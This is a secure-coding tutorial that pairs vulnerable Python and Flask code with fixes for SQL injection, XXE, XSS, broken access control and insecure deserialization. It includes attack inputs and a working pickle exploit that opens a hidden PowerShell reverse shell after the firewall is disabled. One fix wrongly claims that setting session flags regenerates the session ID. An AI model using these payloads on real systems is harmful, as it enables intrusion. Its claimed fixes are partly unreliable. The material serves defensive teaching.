# SCENARIOS

## Injection 

Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. This allows attackers to manipulate the query and execute unintended commands, potentially accessing or modifying data in unauthorized ways.

Real-life Example: SQL Injection

Scenario:
Imagine you are developing an online bookstore application using Python and a MySQL database. Users can search for books by entering keywords into a search field. Your backend code constructs an SQL query using the user’s input to retrieve matching books from the database.



```python
import mysql.connector

def search_books(keyword):
    db = mysql.connector.connect(
        host="localhost",
        user="username",
        password="password",
        database="bookstore"
    )
    cursor = db.cursor()
    
    # Vulnerable SQL query
    query = f"SELECT * FROM books WHERE title LIKE '%{keyword}%'"
    cursor.execute(query)
    
    results = cursor.fetchall()
    for row in results:
        print(row)

search_books("Harry Potter")
```


## Explanation of Vulnerability:

In the above code, the keyword parameter is directly embedded into the SQL query string without any validation or sanitization. This makes the application vulnerable to SQL injection attacks. An attacker can manipulate the input to execute arbitrary SQL commands.

Attack Example:
An attacker could input the following keyword: ' OR '1'='1
This would result in the following SQL query being executed:


``` 
SELECT * FROM books WHERE title LIKE '%' OR '1'='1%'
```

The condition **'1'='1'** is always true, so this query returns all rows in the books table, effectively bypassing the search functionality and exposing the entire database contents.

Mitigation: Use Parameterized Queries and Prepared Statements

Secure Code:

```
import mysql.connector

def search_books(keyword):
    db = mysql.connector.connect(
        host="localhost",
        user="username",
        password="password",
        database="bookstore"
    )
    cursor = db.cursor()
    
    # Secure SQL query using parameterized queries
    query = "SELECT * FROM books WHERE title LIKE %s"
    cursor.execute(query, ('%' + keyword + '%',))
    
    results = cursor.fetchall()
    for row in results:
        print(row)

search_books("Harry Potter")
```

**Explanation of Mitigation:**

In the secure code, the SQL query uses a parameterized query, represented by %s in the query string. The user input (keyword) is passed as a parameter to the execute method. This ensures that the input is properly escaped and treated as a string literal rather than executable code, preventing SQL injection.

# Broken Authentication:

Broken authentication flaws occur when an application’s authentication mechanisms are improperly implemented, allowing attackers to compromise passwords, keys, or session tokens. This can lead to unauthorized access and allow attackers to assume other users' identities.

**Real-life Example: Session Hijacking**

Explanation of Vulnerability
Scenario:
Imagine you are developing a web application where users log in with a username and password. Upon successful authentication, the application creates a session for the user and stores the session ID in a cookie.

**Vulnerable Code Example:**

```
from flask import Flask, request, session, redirect

app = Flask(__name__)
app.secret_key = 'super_secret_key'

# Simulated user database
users = {
    "user1": "password1",
    "user2": "password2"
}

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if username in users and users[username] == password:
        session['user'] = username
        return redirect('/dashboard')
    else:
        return "Invalid credentials", 401

@app.route('/dashboard')
def dashboard():
    if 'user' in session:
        return f"Welcome, {session['user']}!"
    else:
        return redirect('/login')

if __name__ == "__main__":
    app.run()
```

### Explanation of Vulnerability:

Session ID Predictability: If the session ID is predictable or easily guessable, an attacker can hijack the session by obtaining or guessing the session ID.
Insecure Transmission: If the session ID is transmitted over an insecure connection (e.g., HTTP instead of HTTPS), it can be intercepted by an attacker.


**Attack Example:**
An attacker could intercept a session ID using a man-in-the-middle attack on an insecure network, and then use that session ID to impersonate the user.

**Mitigation Techniques**

**1. Implement Multi-Factor Authentication (MFA)**
Multi-Factor Authentication (MFA) adds an extra layer of security by requiring additional verification methods (e.g., a code sent to a user's phone) beyond just a username and password.

**2. Ensure Secure Password Storage**
Passwords should be stored securely using strong hashing algorithms and appropriate salting.

**3. Proper Session Management**
Use Secure Cookies: Ensure that cookies storing session IDs are marked as Secure and HttpOnly to prevent them from being accessed through client-side scripts.
Regenerate Session IDs: Regenerate the session ID after login and periodically during the session to prevent session fixation attacks.
Use HTTPS: Always use HTTPS to encrypt data transmitted between the client and server, protecting the session ID from interception.


### Secure Code Example:

```
from flask import Flask, request, session, redirect
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)
app.secret_key = 'super_secret_key'

# Simulated user database with hashed passwords
users = {
    "user1": generate_password_hash("password1"),
    "user2": generate_password_hash("password2")
}

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if username in users and check_password_hash(users[username], password):
        session['user'] = username
        # Regenerate session ID after login
        session.permanent = True
        session.modified = True
        return redirect('/dashboard')
    else:
        return "Invalid credentials", 401

@app.route('/dashboard')
def dashboard():
    if 'user' in session:
        return f"Welcome, {session['user']}!"
    else:
        return redirect('/login')

if __name__ == "__main__":
    app.run(ssl_context='adhoc')
```

Explanation of Mitigation:

**Password Hashing:** The generate_password_hash and check_password_hash functions from werkzeug.security ensure that passwords are stored securely.

**Session Security:** Regenerating the session ID after login helps prevent session fixation attacks. Running the application with HTTPS (ssl_context='adhoc') ensures secure transmission of session cookies.

**Secure Cookies:** Flask’s session management uses cookies that are marked as Secure and HttpOnly by default if the app is running over HTTPS.


# XML External Entities (XXE):

An XML External Entity (XXE) vulnerability occurs when an XML parser evaluates external entities within XML documents. This can lead to various security issues such as data exposure, denial of service, and server-side request forgery.

Real-life Example: Exposing Internal Files through an XML Endpoint

**Explanation of Vulnerability
Scenario:**
Imagine you are developing a web application that allows users to upload XML files. The application processes these XML files to extract and display the data. An XXE vulnerability can occur if the XML parser is not properly configured to disable external entity processing.

**Vulnerable Code Example:**

```
import xml.etree.ElementTree as ET

def process_xml(xml_data):
    root = ET.fromstring(xml_data)
    # Process the XML data
    for element in root.findall('.//data'):
        print(element.text)

# Example of XML data with an external entity
xml_data = '''
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    &xxe;
</data>
'''

process_xml(xml_data)
```

**Explanation of Vulnerability:**

External Entities: The XML document defines an external entity xxe that references the contents of the /etc/passwd file.
Entity Expansion: When the XML parser processes the document, it tries to expand the &xxe; entity, potentially exposing sensitive data.
Attack Example:
An attacker could craft an XML file with an external entity pointing to sensitive files on the server:


```
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    &xxe;
</data>
```

When this XML is processed by the vulnerable code, the contents of /etc/passwd would be exposed, leading to a potential data breach.

Mitigation Techniques
1. Disable External Entity Processing
Configure the XML parser to disallow the processing of external entities. This prevents the parser from accessing external resources defined in the XML document.

2. Use Secure XML Parsers
Use XML parsers that have secure default configurations, or explicitly configure them to be secure.

Secure Code Example:
Here’s how you can securely configure the xml.etree.ElementTree parser in Python to prevent XXE vulnerabilities:

```
import defusedxml.ElementTree as ET

def process_xml_secure(xml_data):
    # Secure XML processing using defusedxml
    parser = ET.XMLParser()
    root = ET.fromstring(xml_data, parser=parser)
    # Process the XML data
    for element in root.findall('.//data'):
        print(element.text)

# Example of XML data with an external entity (this will not be processed)
xml_data = '''
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    &xxe;
</data>
'''

process_xml_secure(xml_data)
```

Explanation of Mitigation:

**Defusedxml Library:** The defusedxml library is used to securely parse XML data. It is specifically designed to prevent XXE and other XML-related vulnerabilities.
No External Entity Processing: The secure parser does not process external entities, effectively mitigating the XXE vulnerability.


# Broken Access Control

Broken access control occurs when restrictions on what authenticated users are allowed to do are not properly enforced. This can allow attackers to access unauthorized data or perform actions that they should not be able to.

Real-life Example: Accessing Other Users' Data by Manipulating URLs

Explanation of Vulnerability
Scenario:
Imagine you are developing a web application where users can view and edit their profiles. Each user profile is accessed via a URL like http://example.com/user/{userID}. If access control is not properly enforced, an attacker could manipulate the URL to access other users' profiles.

**Vulnerable Code Example:**
```
from flask import Flask, request, redirect, session

app = Flask(__name__)
app.secret_key = 'super_secret_key'

# Simulated user database
users = {
    1: {"username": "user1", "password": "password1"},
    2: {"username": "user2", "password": "password2"}
}

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    for user_id, user_info in users.items():
        if user_info['username'] == username and user_info['password'] == password:
            session['user_id'] = user_id
            return redirect(f'/user/{user_id}')
    return "Invalid credentials", 401

@app.route('/user/<int:user_id>')
def user_profile(user_id):
    # Vulnerable: No check to ensure the user is accessing their own profile
    user_info = users.get(user_id)
    if user_info:
        return f"User ID: {user_id}, Username: {user_info['username']}"
    return "User not found", 404

if __name__ == "__main__":
    app.run()
```

**Explanation of Vulnerability:**

No Access Control Check: The /user/<int:user_id> route does not verify whether the authenticated user is allowed to access the specified user_id.
URL Manipulation: An authenticated user can change the user_id in the URL to access other users' profiles.
Attack Example:
An attacker logs in as user1 and gets redirected to http://example.com/user/1. The attacker then changes the URL to http://example.com/user/2 to access user2's profile.

Mitigation Techniques
1. Implement Proper Access Controls
Ensure that only authorized users can access or perform actions on the resources they are permitted to.

2. Conduct Thorough Testing
Perform regular security testing, including penetration testing and code reviews, to identify and fix access control vulnerabilities.

**Secure Code Example:**
Here’s how you can implement proper access control in the Flask application:

```
from flask import Flask, request, redirect, session

app = Flask(__name__)
app.secret_key = 'super_secret_key'

# Simulated user database
users = {
    1: {"username": "user1", "password": "password1"},
    2: {"username": "user2", "password": "password2"}
}

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    for user_id, user_info in users.items():
        if user_info['username'] == username and user_info['password'] == password:
            session['user_id'] = user_id
            return redirect(f'/user/{user_id}')
    return "Invalid credentials", 401

@app.route('/user/<int:user_id>')
def user_profile(user_id):
    # Secure: Check if the logged-in user is accessing their own profile
    if 'user_id' not in session:
        return redirect('/login')
    
    if session['user_id'] != user_id:
        return "Access denied", 403

    user_info = users.get(user_id)
    if user_info:
        return f"User ID: {user_id}, Username: {user_info['username']}"
    return "User not found", 404

if __name__ == "__main__":
    app.run()
```


Explanation of Mitigation:

Session Check: Ensure the user is logged in by checking the session.
User ID Validation: Verify that the user_id in the URL matches the authenticated user's ID stored in the session.
Access Denied Response: Return a 403 Forbidden response if the user tries to access another user's profile.




# Secure Configuration 

Security misconfiguration is a common vulnerability that arises when applications, servers, databases, or other systems are configured insecurely, leaving them vulnerable to attacks. This can happen due to insecure default settings, incomplete configurations, open cloud storage, or ad hoc setups that haven't been properly secured.

Real-life Example: Default Admin Credentials

Explanation of Vulnerability
Scenario:
Imagine you are setting up a web application and its corresponding database. During the setup, the application and the database come with default credentials (e.g., admin:admin or root:password). If these default credentials are not changed, an attacker could easily gain administrative access to your system.

**Vulnerable Configuration Example:x**
Let's say you set up a MySQL database for your application. The default root password is set to password.

```
-- Vulnerable configuration example
CREATE USER 'root'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION;
```

Explanation of Vulnerability:

Default Credentials: Using default credentials like root:password is insecure because these are well-known and can be easily exploited by attackers.
Administrative Access: The root user has full administrative privileges. If an attacker gains access using these credentials, they can control the entire database.
Attack Example:
An attacker scans for databases with default credentials and successfully logs in using root:password, gaining full control over the database and potentially the entire application.

Mitigation Techniques
1. Implement a Robust Hardening Process
Hardening involves securing a system by reducing its surface of vulnerability, which is larger when a system performs more functions. Here are steps to harden your system:

Change Default Credentials: Always change default usernames and passwords to strong, unique credentials.
Disable Unnecessary Services: Turn off services that are not needed to reduce potential attack vectors.
Apply Security Patches: Regularly update your software and systems with the latest security patches.
Configure Firewalls and Security Groups: Restrict access to your systems by configuring firewalls and security groups properly.
2. Use Automated Tools to Verify Configurations
Automated tools can help identify misconfigurations and ensure that your systems are secure:

Configuration Management Tools: Use tools like Ansible, Puppet, or Chef to automate the configuration of your systems and ensure they comply with your security policies.
Security Scanners: Use security scanning tools like Nessus, OpenVAS, or commercial solutions to scan your systems for vulnerabilities and misconfigurations.
Cloud Security Posture Management (CSPM): Tools like AWS Config, Azure Security Center, and Google Cloud Security Command Center can help monitor and maintain secure configurations in cloud environments.


**Secure Configuration Example:**
Here’s how you can securely configure your MySQL database by changing the default credentials and restricting access:

```
-- Create a new user with access restricted to the application server's IP
CREATE USER 'app_user'@'192.168.1.10' IDENTIFIED BY 'strong_password_123!';

-- Grant necessary privileges to the new user
GRANT ALL PRIVILEGES ON your_database.* TO 'app_user'@'192.168.1.10';

-- Remove default root user to prevent misuse
DROP USER 'root'@'localhost';

-- Ensure the changes take effect
FLUSH PRIVILEGES;
```


# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) flaws occur when an application includes untrusted data in a web page without proper validation or escaping, or updates an existing web page with user-supplied data using a browser API that can create HTML or JavaScript. This allows attackers to execute arbitrary scripts in the user's browser, which can hijack user sessions, deface websites, or redirect users to malicious sites.


**Potential for Malicious Activities:**

While the alert box example is benign, the ability to execute arbitrary JavaScript can be used for various malicious purposes, such as:
Session Hijacking: Stealing session cookies to impersonate the user.
Phishing: Redirecting the user to a fake login page to steal credentials.
Data Theft: Accessing and exfiltrating sensitive data displayed on the page.
Defacement: Modifying the content of the webpage.
Spreading Malware: Inserting malicious scripts that could download malware onto the user’s device.

Real-life Example: Injecting JavaScript into a Comment Section

Explanation of Vulnerability
Scenario:
Imagine you are developing a web application that has a comment section where users can post comments. If the application does not properly validate or escape the user input, an attacker can inject malicious JavaScript code into the comment section.



### Setting Up a Virtual Environment with Git Bash in VSCode
Open VSCode:

1. Open VSCode and create a new workspace or open the folder where you want to create your project.
Open Terminal:

2. Open the integrated terminal in VSCode. You can do this by pressing Ctrl + (backtick) or going to View > Terminal.


3. Create the Project Directory:


```
mkdir flask_xss_demo
cd flask_xss_demo
```

4. Create a Virtual Environment:

On Windows:

```
python -m venv venv
source venv/Scripts/activate
```
5. On macOS/Linux:

```
python3 -m venv venv
source venv/bin/activate
```

*If the command source venv/Scripts/activate doesn't work on Windows, try:*

```
. venv/Scripts/activate
```


6. Install Flask:

```
pip install Flask
```

**Creating and Running the Vulnerable Application**

1. Create the Vulnerable Code:

In VSCode, create a new file named **app_vulnerable.py**

```
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

comments = []

@app.route('/')
def index():
    return render_template_string('''
        <h1>Comments</h1>
        <form action="/comment" method="post">
            <textarea name="comment"></textarea><br>
            <input type="submit" value="Post Comment">
        </form>
        <ul>
        {% for comment in comments %}
            <li>{{ comment|safe }}</li>
        {% endfor %}
        </ul>
    ''', comments=comments)

@app.route('/comment', methods=['POST'])
def comment():
    comment = request.form['comment']
    comments.append(comment)
    return redirect('/')

if __name__ == "__main__":
    app.run(debug=True)
```

2. Run the Vulnerable Application:

In the integrated terminal, run the application:

```
python app_vulnerable.py
```

3. Access the Application in a Browser:

Open your web browser and go to http://127.0.0.1:5000/.
Enter the following comment to test the XSS vulnerability

```
<script>window.location.href = 'https://www.facebook.com';</script>
```


### Creating and Running the Secure Application
1. Create the Secure Code:

In VSCode, create a new file named app_secure.py

```
from flask import Flask, request, render_template_string, redirect
from markupsafe import escape

app = Flask(__name__)

comments = []

@app.route('/')
def index():
    return render_template_string('''
        <h1>Comments</h1>
        <form action="/comment" method="post">
            <textarea name="comment"></textarea><br>
            <input type="submit" value="Post Comment">
        </form>
        <ul>
        {% for comment in comments %}
            <li>{{ comment|e }}</li>
        {% endfor %}
        </ul>
    ''', comments=comments)

@app.route('/comment', methods=['POST'])
def comment():
    comment = request.form['comment']
    escaped_comment = escape(comment)
    comments.append(escaped_comment)
    return redirect('/')

if __name__ == "__main__":
    app.run(debug=True)

```


2. Run the Secure Application:

In the integrated terminal, run the application

```
python app_secure.py
```

3. Access the Secure Application in a Browser:

Open your web browser and go to http://127.0.0.1:5000/.
Enter the same malicious comment:

```
<script>window.location.href = 'https://www.facebook.com';</script>
```

### Detailed Difference Between the Vulnerable and Secure Code
Vulnerable Code
File: app_vulnerable.py

```
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

comments = []

@app.route('/')
def index():
    return render_template_string('''
        <h1>Comments</h1>
        <form action="/comment" method="post">
            <textarea name="comment"></textarea><br>
            <input type="submit" value="Post Comment">
        </form>
        <ul>
        {% for comment in comments %}
            <li>{{ comment|safe }}</li>
        {% endfor %}
        </ul>
    ''', comments=comments)

@app.route('/comment', methods=['POST'])
def comment():
    comment = request.form['comment']
    comments.append(comment)
    return redirect('/')

if __name__ == "__main__":
    app.run(debug=True)
```

Explanation of Vulnerable Code
1. User Input Directly Included:

In the vulnerable code, user input is directly rendered in the HTML without any escaping or validation.
The line {{ comment|safe }} explicitly tells Jinja2 to render the comment as raw HTML, which means any HTML or JavaScript code submitted by the user will be executed by the browser.

2. Potential Exploit:

An attacker can submit a comment with malicious JavaScript code such as <script>window.location.href = 'https://www.facebook.com';</script>.
When the page is rendered, this script is executed by the browser, leading to a potential XSS attack.

3. No Input Validation:

The user input is appended to the comments list without any form of sanitization or escaping.
Secure Code
File: app_secure.py
```
from flask import Flask, request, render_template_string, redirect
from markupsafe import escape

app = Flask(__name__)

comments = []

@app.route('/')
def index():
    return render_template_string('''
        <h1>Comments</h1>
        <form action="/comment" method="post">
            <textarea name="comment"></textarea><br>
            <input type="submit" value="Post Comment">
        </form>
        <ul>
        {% for comment in comments %}
            <li>{{ comment|e }}</li>
        {% endfor %}
        </ul>
    ''', comments=comments)

@app.route('/comment', methods=['POST'])
def comment():
    comment = request.form['comment']
    escaped_comment = escape(comment)
    comments.append(escaped_comment)
    return redirect('/')

if __name__ == "__main__":
    app.run(debug=True)
```


Explanation of Secure Code
1. User Input Escaped:

The secure code uses the escape function from markupsafe to sanitize user input before rendering it in the HTML.
The line {{ comment|e }} tells Jinja2 to escape any HTML special characters in the comment, ensuring that any potentially dangerous characters are converted to their HTML-safe equivalents (< becomes &lt;, > becomes &gt;, etc.).

2. Mitigating XSS:

When a user submits a comment with malicious JavaScript code, the escape function sanitizes it, preventing the script from executing.
For example, <script>window.location.href = 'https://www.facebook.com';</script> is rendered as &lt;script&gt;window.location.href = 'https://www.facebook.com';&lt;/script&gt;, which displays as text in the browser rather than being executed.

3. Input Validation and Escaping:

The escape function is applied to user input before it is added to the comments list and rendered on the page.
This ensures that all user input is treated as text, not executable code.
### Key Differences

1. Rendering User Input:

Vulnerable Code: Uses {{ comment|safe }}, which renders user input as raw HTML, allowing any HTML or JavaScript code to be executed.
Secure Code: Uses {{ comment|e }} and escape(comment), which escape special characters in user input, ensuring it is rendered as text.

2. Security:

Vulnerable Code: Susceptible to XSS attacks as it does not sanitize user input.
Secure Code: Mitigates XSS attacks by escaping user input, preventing malicious scripts from being executed.

3. Handling User Input:

Vulnerable Code: Appends user input directly to the comments list and renders it without modification.
Secure Code: Escapes user input before appending it to the comments list and rendering it.



# Exploiting Insecure Deserialization


Introduction to Serialization and Deserialization
Serialization is the process of converting an object into a format that can be easily stored or transmitted (e.g., to a file, database, or over a network). The serialized data can later be deserialized to recreate the original object.

Deserialization is the reverse process where serialized data is converted back into a copy of the original object.

Types of Exploits Using Insecure Deserialization
Insecure deserialization can lead to various types of exploits, such as:

**Remote Code Execution (RCE):** An attacker can execute arbitrary code on the target system.

**Denial of Service (DoS):** Malicious payloads can be used to crash the application.

**Data Tampering:** Manipulating serialized data to alter application behavior or access unauthorized data.



### Prerequisites for the Demo

1. Disable Windows Firewall (for testing purposes):

```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

2. Install Netcat (Ncat) & NPCAP:

https://nmap.org/download.html

https://npcap.com/#download

Download Netcat for Windows from Netcat for Windows.

Extract the downloaded ZIP file to a folder.

Add the folder to your system's PATH environment variable or navigate to the folder in Command Prompt when using Netcat.


2.1 OS Information Gathering 

```
nmap -O -v 127.0.0.1
```

3. Set PowerShell Execution Policy:

```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```


Vulnerable Example Demo
Dependencies:

Python 3
Flask
Files:

1. app_vulnerable.py:


```
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route('/set_session', methods=['POST'])
def set_session():
    user_id = request.form['user_id']
    session_data = request.form['session_data']
    # Insecure serialization of session data
    serialized_data = pickle.dumps(session_data)
    encoded_data = base64.b64encode(serialized_data).decode('utf-8')
    return encoded_data

@app.route('/get_session', methods=['POST'])
def get_session():
    encoded_data = request.form['session_data']
    # Decode the Base64-encoded data
    try:
        serialized_data = base64.b64decode(encoded_data)
        # Insecure deserialization of session data
        session_data = pickle.loads(serialized_data)
        return str(session_data)
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    app.run(debug=True)

```



2. create_payload.py:

```
import pickle
import base64

# Define a malicious class
class Malicious:
    def __reduce__(self):
        import os
        return (os.system, (
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            "\"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{0};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte, 0, $sendbyte.Length);"
            "$stream.Flush()"
            "};"
            "$client.Close()\""
        ,))

# Serialize the malicious object
malicious_payload = pickle.dumps(Malicious())
encoded_payload = base64.b64encode(malicious_payload).decode('utf-8')
print(encoded_payload)
```


Steps:

1. Run the create_payload.py Script:


```
python create_payload.py
```

###


2. Start the Flask Application:
```
python app_vulnerable.py
```

###

3. Set Up the Listener with Netcat:

```
ncat -lvnp 4444   
```





###

4. 
Send the Payload to the Flask Application:


```
curl -X POST -d "user_id=1&session_data=<Base64_encoded_payload>" --output response.txt http://127.0.0.1:5000/set_session
```

Replace ***<Base64_encoded_payload>*** with the actual encoded string output from create_payload.py.



5. Trigger Deserialization:

```
curl -X POST -d "session_data=<Base64_encoded_payload>" --output response.txt http://127.0.0.1:5000/get_session
```
Replace ***<Base64_encoded_payload>*** with the actual encoded string from step 1.



Result:
If everything worked correctly, you should see a connection in your Netcat listener terminal, giving you a reverse shell.


Fixing the Vulnerability

To fix the vulnerability, ensure that deserialization of untrusted data is avoided. Use secure methods for serialization like JSON, and always validate and sanitize inputs.

##

The main differences between the vulnerable code and the secure code are related to how they handle serialization and deserialization of data, as well as input validation. Let's highlight the key differences:

### Vulnerable Code (app_vulnerable.py)
Serialization and Deserialization using pickle

Serialization: Uses pickle.dumps to serialize session data.

Deserialization: Uses pickle.loads to deserialize session data.

Risk: pickle is capable of executing arbitrary code during deserialization, which can be exploited if the data being deserialized is not trusted.


### 

### Secure Code (app_secure.py)
Serialization and Deserialization using json

Serialization: Uses json.dumps to serialize session data.

Deserialization: Uses json.loads to deserialize session data.

Benefit: json does not execute code during deserialization, making it much safer for handling untrusted data.












































